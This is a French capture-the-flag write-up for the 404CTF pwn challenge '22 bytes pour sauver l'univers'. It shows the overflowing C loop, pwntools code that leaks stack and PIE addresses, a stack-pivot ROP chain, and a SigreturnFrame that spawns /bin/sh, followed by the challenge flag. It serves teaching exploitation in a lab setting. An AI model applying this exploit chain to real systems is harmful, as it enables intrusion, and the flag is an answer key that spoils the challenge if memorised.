# Writeup pour `22 bytes pour sauver l'univers`

Auteur : *Pwnsard*  
Difficulté : *Moyen*

### Notions principales :
- SigReturn Oriented Programming
- Stack Pivot

### Protections :

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   13 Symbols	  N/A	0		0		data/chall
```

### Principe

Il s'agit d'un buffer overflow de 22 bytes, avec donc une place assez limitée sur la stack pour stocker une ROPchain, et très peu de gadgets à notre disposition.  
*Le challenge a été codé en C car il a beaucoup évolué au cours du développement, mais il aurait du être écrit en assembleur. Il ne fait que des syscalls et n'utilise pas de libc.*  

```C
char boucle[4] = "\x01";
char decisions[0x14];

while (boucle[0])  {
    puts("Que comptez vous faire ?\n");
    puts(">> ");
    read(0, decisions, 0x18 + 22);
    puts("Le soleil explose !\n");
    puts("Vous revoyez vos 22 derniers bytes : ");
    puts(decisions);
    puts("\nMais pas de panique, vous êtes dans une boucle temporelle...");
    puts("\n------------------------------------------------------------------------------\n");
}
```

Avec cet overflow de 22 bytes, il est trivial d'obtenir un leak de l'adresse de la stack, puis un leak du PIE : 

```python
print("[*] Leaking phase")
payload = b"A" * 31
r.recvuntil(b">> ")
r.sendline(payload)
leak = r.recvuntil(b"Mais").split(b'\n')
stack_leak_addr = int.from_bytes(leak[2], "little")
print(f"stack leak : {hex(stack_leak_addr)}")

payload = b"A" * 39
r.recvuntil(b">> ")
r.sendline(payload)
leak = r.recvuntil(b"Mais").split(b'\n')
exe.address = int.from_bytes(leak[2], "little") - 0x443
print(f".text@{hex(exe.address)}")
```
On peut quitter la boucle en overwritant le buffer "boucle" avec des null bytes, et récupérer le flow d'exécution en utilisant le `ret` de la fonction `main`.  
Pour résoudre le coeur du challenge, ma solution est d'effectuer un stack pivot un peu serré sur le début du payload. On a ensuite la place d'appeler la fonction read et pouvoir écrire un très grand deuxième payload sur la stack :

```python
print("[*] Setup ROPchain")
rop = ROP(exe)
leave_ret_gadget = rop.find_gadget(["leave", "ret"])[0]
pop_rbp_gadget = rop.find_gadget(["pop rbp", "ret"])[0]
spoofed_stack_pointer = stack_leak_addr - 0x30
arbitrary_write_addr = stack_leak_addr - 0x20

payload = p64(stack_leak_addr - 0x10)  # This points to "spoofed_stack_pointer", allows an arbitrary read
payload += p64(exe.address + 0x377)    # This points to the read syscall inside of the program. Because rbp has been spoofed, the syscall will use the rest of the payload as arguments
payload += p64(arbitrary_write_addr)   # arbitrary_write_addr in rsi
payload += b"\x00\xff\x00\x00"         # 0xff00 in rdx (count for read)
payload += b"\x00\x00\x00\x00"         # 0 in rdi      (stdin file descriptor)

payload += p64(spoofed_stack_pointer)  # Stack pivot, this address points to the origin of the payload
payload += p64(leave_ret_gadget)[:-2]  # First executed gadget, allows for a stack pivot to the origin of the payload
r.recvuntil(b">> ")
print("[*] Getting arbitrary write")
print(payload)
print(hex(leave_ret_gadget))
r.send(payload)
```

Enfin on peut stocker une Sigreturn Frame sur la stack, puis exécuter le syscall `sigreturn` à l'aide d'un dernier syscall read de taille 0xf pour avoir la bonne valeur dans `rax`. 

```python
# Now we have an arbitrary write
syscall_address = exe.address + 0x386
read_address = exe.address + 0x381

sigreturn_frame = SigreturnFrame()
sigreturn_frame.rax = 0x3b
sigreturn_frame.rip = syscall_address
sigreturn_frame.rdi = stack_leak_addr + 0xf8 # points to /bin/sh

print("[*] Setup a sigreturn frame")
payload = b"B" * 8 + p64(read_address) + b"D" * 0x8 + p64(syscall_address) + bytes(sigreturn_frame) + b"/bin/sh\x00"
r.sendline(payload)

payload = b"C" * 0xe
r.sendline(payload)
```

### Script de résolution :

Voir `solve.py`

### Flag : 

`404CTF{14,3_M1lL1ardS_d'AnnÉe$_Plu$_7ARd...}`